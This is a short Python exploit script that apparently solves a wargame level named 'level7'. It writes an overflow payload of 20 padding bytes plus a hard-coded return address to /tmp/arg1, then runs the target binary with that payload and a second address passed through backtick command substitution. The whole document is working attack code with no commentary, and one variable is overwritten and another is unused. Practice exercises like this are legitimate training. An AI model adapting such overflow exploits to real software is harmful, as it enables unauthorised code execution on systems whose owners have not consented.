#!/usr/bin/python

import os

writeAddr = "\x08\x04\x99\x60"[::-1]
writeAddr = "\x08\x04\x99\x28"[::-1]
writeContent = "\x08\x04\x87\x03"[::-1]
mAddr = "\x08\x04\x84\xf4"[::-1]
arg1 = 20*"A" + writeAddr
arg2 = mAddr
args = "`cat /tmp/arg1` " + arg2
f = open('/tmp/arg1', 'w')
f.write(arg1)
f.close()
cmd = "/home/user/level7/level7 " + args
print(args)
os.system(cmd)
